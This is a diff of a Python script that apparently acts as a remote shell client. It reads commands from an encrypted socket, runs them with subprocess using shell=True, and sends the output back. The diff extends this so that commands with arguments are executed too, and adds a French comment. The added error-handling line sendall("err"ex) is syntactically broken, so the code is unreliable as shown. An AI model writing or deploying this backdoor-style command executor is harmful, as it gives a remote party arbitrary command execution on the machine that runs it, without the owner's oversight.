@@ -28,15 +28,25 @@ try:
         cmd = received_data.decode().split()
         print(cmd)
         received_data = 0
+        # la commande a-t-elle des paramètres ?
         if len(cmd) >= 2:
             if cmd[0] == "cd" or cmd[0] == "CD":
                 os.chdir(cmd[1])
                 output = "changed directory to {}".format(cmd[1])
                 wrappedSocket.sendall(output.encode())
             else:
-                break
+                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                       stderr=subprocess.PIPE)
+                output, err = command.communicate()
+                if not err:
+                    wrappedSocket.sendall(output)
+                elif not output:
+                    wrappedSocket.sendall(err)
+                else:
+                    wrappedSocket.sendall("err"ex)
         else:
-            command = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
+            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                       stderr=subprocess.PIPE)
             output, err = command.communicate()
             wrappedSocket.sendall(output)
 finally:
